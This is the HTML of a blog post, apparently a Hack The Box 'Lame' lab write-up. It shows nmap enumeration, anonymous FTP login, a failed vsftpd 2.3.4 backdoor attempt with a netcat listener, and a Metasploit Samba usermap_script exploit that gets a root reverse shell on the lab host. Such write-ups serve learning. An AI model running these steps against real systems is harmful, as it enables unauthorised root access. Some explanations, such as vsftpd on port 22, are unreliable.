@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="samba vsftpd 0-EnumerationPort scanning using nmap. 1sudo nmap -n -v -sC -sV -sS -T4 -p- 10.10.10.3 --max-retries&#x3D;0 The result is as follows: 1234567891011121314151617181920212223242526272829303132333">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Linux-0-Lame">
+<meta property="og:url" content="http://example.com/2023/10/29/HTB-Linux-0-Lame/index.html">
+<meta property="og:site_name" content="vwv">
+<meta property="og:description" content="samba vsftpd 0-EnumerationPort scanning using nmap. 1sudo nmap -n -v -sC -sV -sS -T4 -p- 10.10.10.3 --max-retries&#x3D;0 The result is as follows: 1234567891011121314151617181920212223242526272829303132333">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-10-29T15:00:00.000Z">
+<meta property="article:modified_time" content="2023-10-29T15:34:10.230Z">
+<meta property="article:author" content="vwv">
+<meta property="article:tag" content="htb">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB-Linux-0-Lame</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/10/18/page/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/10/29/HTB-Linux-0-Lame/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/10/29/HTB-Linux-0-Lame/&text=HTB-Linux-0-Lame"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/10/29/HTB-Linux-0-Lame/&title=HTB-Linux-0-Lame"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/10/29/HTB-Linux-0-Lame/&is_video=false&description=HTB-Linux-0-Lame"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-Linux-0-Lame&body=Check out this article: http://example.com/2023/10/29/HTB-Linux-0-Lame/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/10/29/HTB-Linux-0-Lame/&title=HTB-Linux-0-Lame"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/10/29/HTB-Linux-0-Lame/&title=HTB-Linux-0-Lame"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/10/29/HTB-Linux-0-Lame/&title=HTB-Linux-0-Lame"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/10/29/HTB-Linux-0-Lame/&title=HTB-Linux-0-Lame"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/10/29/HTB-Linux-0-Lame/&name=HTB-Linux-0-Lame&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/10/29/HTB-Linux-0-Lame/&t=HTB-Linux-0-Lame"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0-Enumeration"><span class="toc-number">1.</span> <span class="toc-text">0-Enumeration</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-Exploration"><span class="toc-number">2.</span> <span class="toc-text">1-Exploration</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ftp-Anonymous-Login"><span class="toc-number">2.1.</span> <span class="toc-text">Ftp Anonymous Login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vsftpd-2-3-4-Backdoor"><span class="toc-number">2.2.</span> <span class="toc-text">Vsftpd 2.3.4 Backdoor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Samba-USERNAME-Map-Script"><span class="toc-number">2.3.</span> <span class="toc-text">Samba USERNAME Map Script</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-Summary"><span class="toc-number">3.</span> <span class="toc-text">2-Summary</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Samba"><span class="toc-number">3.1.</span> <span class="toc-text">Samba</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Samba-USERNAME-Map-Script-1"><span class="toc-number">3.1.1.</span> <span class="toc-text">Samba USERNAME Map Script</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vsftpd"><span class="toc-number">3.2.</span> <span class="toc-text">Vsftpd</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Vsftpd-2-3-4-Backdoor-1"><span class="toc-number">3.2.1.</span> <span class="toc-text">Vsftpd 2.3.4 Backdoor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FTP-Anonymous-Login"><span class="toc-number">3.2.2.</span> <span class="toc-text">FTP  Anonymous Login</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HTB-Linux-0-Lame
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">vwv</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-29T15:00:00.000Z" class="dt-published" itemprop="datePublished">2023-10-29</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/htb/" rel="tag">htb</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><code>samba</code> <code>vsftpd</code></p>
+<h1 id="0-Enumeration"><a href="#0-Enumeration" class="headerlink" title="0-Enumeration"></a>0-Enumeration</h1><p>Port scanning using nmap.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -n -v -sC -sV -sS -T4 -p- 10.10.10.3 --max-retries=0</span><br></pre></td></tr></table></figure>
+<p>The result is as follows:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21/tcp   open  ftp         vsftpd 2.3.4</span><br><span class="line">| ftp-syst:</span><br><span class="line">|   STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 10.10.16.24</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      vsFTPd 2.3.4 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)</span><br><span class="line">|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open              Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)</span><br><span class="line">3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 2h00m21s, deviation: 2h49m44s, median: 19s</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Unix (Samba 3.0.20-Debian)</span><br><span class="line">|   Computer name: lame</span><br><span class="line">|   NetBIOS computer name:</span><br><span class="line">|   Domain name: hackthebox.gr</span><br><span class="line">|   FQDN: lame.hackthebox.gr</span><br><span class="line">|_  System time: 2023-10-29T09:20:56-04:00</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br></pre></td></tr></table></figure>
+<p>Utilization point:</p>
+<ul>
+<li>ftp anonymous access</li>
+<li>vsftpd 2.3.4 backdoor</li>
+<li>samba USERNAME map script</li>
+</ul>
+<h1 id="1-Exploration"><a href="#1-Exploration" class="headerlink" title="1-Exploration"></a>1-Exploration</h1><h2 id="Ftp-Anonymous-Login"><a href="#Ftp-Anonymous-Login" class="headerlink" title="Ftp Anonymous Login"></a>Ftp Anonymous Login</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">─$ ftp anonymous@10.10.10.3</span><br><span class="line">Connected to 10.10.10.3.</span><br><span class="line">220 (vsFTPd 2.3.4)</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br></pre></td></tr></table></figure>
+<p>We can log in use anonymous account.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; dir</span><br><span class="line">229 Entering Extended Passive Mode (|||48596|).</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; bye</span><br><span class="line">221 Goodbye.</span><br></pre></td></tr></table></figure>
+<p>Howerver, nothing exists here.</p>
+<h2 id="Vsftpd-2-3-4-Backdoor"><a href="#Vsftpd-2-3-4-Backdoor" class="headerlink" title="Vsftpd 2.3.4 Backdoor"></a>Vsftpd 2.3.4 Backdoor</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">─$ ftp 10.10.10.3</span><br><span class="line">Connected to 10.10.10.3.</span><br><span class="line">220 (vsFTPd 2.3.4)</span><br><span class="line">Name (10.10.10.3:vwv): test:)</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>Listening on local:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ sudo nc -nvlp 6200</span><br><span class="line">[sudo] password for vwv:</span><br><span class="line">listening on [any] 6200 ...</span><br></pre></td></tr></table></figure>
+<p>Nothing happened.</p>
+<h2 id="Samba-USERNAME-Map-Script"><a href="#Samba-USERNAME-Map-Script" class="headerlink" title="Samba USERNAME Map Script"></a>Samba USERNAME Map Script</h2><p>use msf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<p>Looking for vulnerabilities related to samba.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search samba</span><br></pre></td></tr></table></figure>
+<p>We select <code>exploit/multi/samba/usermap_script</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 8</span><br></pre></td></tr></table></figure>
+<p>Set RHOSTS and LHOST.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set RHOSTS 10.10.10.3</span><br><span class="line">set LHOST 10.10.16.24</span><br></pre></td></tr></table></figure>
+<p>Run it.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/samba/usermap_script) &gt; run</span><br><span class="line"></span><br><span class="line">[-] Handler failed to bind to 10.10.16.24:4444:-  -</span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:4444</span><br><span class="line">[*] Command shell session 1 opened (192.168.84.217:4444 -&gt; 192.168.80.1:53325) at 2023-10-29 22:28:04 +0800</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+<p>Get permission.</p>
+<h1 id="2-Summary"><a href="#2-Summary" class="headerlink" title="2-Summary"></a>2-Summary</h1><h2 id="Samba"><a href="#Samba" class="headerlink" title="Samba"></a>Samba</h2><p>Samba is a protocol for sharing files, printers or other resources. Two common port used:</p>
+<ul>
+<li>139 commonly used in early samba</li>
+<li>445 commonly used in common network environment</li>
+</ul>
+<h3 id="Samba-USERNAME-Map-Script-1"><a href="#Samba-USERNAME-Map-Script-1" class="headerlink" title="Samba USERNAME Map Script"></a>Samba USERNAME Map Script</h3><p>Before authentication, USER_NAME is mapped and parsed. User_name will be executed as a command.</p>
+<h2 id="Vsftpd"><a href="#Vsftpd" class="headerlink" title="Vsftpd"></a>Vsftpd</h2><p>vsftpd is a usual FTPserver based in unix. It used in port 22.</p>
+<h3 id="Vsftpd-2-3-4-Backdoor-1"><a href="#Vsftpd-2-3-4-Backdoor-1" class="headerlink" title="Vsftpd 2.3.4 Backdoor"></a>Vsftpd 2.3.4 Backdoor</h3><p>When entering the username with <code>:)</code>,port 6200 canbe opened, connected it can get a reverse shell.</p>
+<h3 id="FTP-Anonymous-Login"><a href="#FTP-Anonymous-Login" class="headerlink" title="FTP  Anonymous Login"></a>FTP  Anonymous Login</h3><p>The username is anonymous, and you can log in directly with the empty password.</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0-Enumeration"><span class="toc-number">1.</span> <span class="toc-text">0-Enumeration</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-Exploration"><span class="toc-number">2.</span> <span class="toc-text">1-Exploration</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ftp-Anonymous-Login"><span class="toc-number">2.1.</span> <span class="toc-text">Ftp Anonymous Login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vsftpd-2-3-4-Backdoor"><span class="toc-number">2.2.</span> <span class="toc-text">Vsftpd 2.3.4 Backdoor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Samba-USERNAME-Map-Script"><span class="toc-number">2.3.</span> <span class="toc-text">Samba USERNAME Map Script</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-Summary"><span class="toc-number">3.</span> <span class="toc-text">2-Summary</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Samba"><span class="toc-number">3.1.</span> <span class="toc-text">Samba</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Samba-USERNAME-Map-Script-1"><span class="toc-number">3.1.1.</span> <span class="toc-text">Samba USERNAME Map Script</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vsftpd"><span class="toc-number">3.2.</span> <span class="toc-text">Vsftpd</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Vsftpd-2-3-4-Backdoor-1"><span class="toc-number">3.2.1.</span> <span class="toc-text">Vsftpd 2.3.4 Backdoor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FTP-Anonymous-Login"><span class="toc-number">3.2.2.</span> <span class="toc-text">FTP  Anonymous Login</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/10/29/HTB-Linux-0-Lame/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/10/29/HTB-Linux-0-Lame/&text=HTB-Linux-0-Lame"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/10/29/HTB-Linux-0-Lame/&title=HTB-Linux-0-Lame"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/10/29/HTB-Linux-0-Lame/&is_video=false&description=HTB-Linux-0-Lame"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-Linux-0-Lame&body=Check out this article: http://example.com/2023/10/29/HTB-Linux-0-Lame/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/10/29/HTB-Linux-0-Lame/&title=HTB-Linux-0-Lame"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/10/29/HTB-Linux-0-Lame/&title=HTB-Linux-0-Lame"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/10/29/HTB-Linux-0-Lame/&title=HTB-Linux-0-Lame"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/10/29/HTB-Linux-0-Lame/&title=HTB-Linux-0-Lame"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/10/29/HTB-Linux-0-Lame/&name=HTB-Linux-0-Lame&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/10/29/HTB-Linux-0-Lame/&t=HTB-Linux-0-Lame"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023
+    vwv
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
